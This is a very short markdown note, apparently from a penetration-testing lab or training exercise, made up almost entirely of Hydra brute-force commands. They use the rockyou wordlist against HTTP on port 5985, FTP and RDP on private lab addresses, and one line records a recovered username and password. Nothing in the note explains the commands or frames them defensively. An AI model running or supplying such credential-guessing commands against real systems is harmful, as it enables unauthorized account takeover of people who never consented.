### hydra on http service
hydra -l itadmin -P /usr/share/wordlists/rockyou.txt 192.168.141.202 -s 5985 http-get /

hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.141.202

*** itadmin hellokitty

hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.214.227
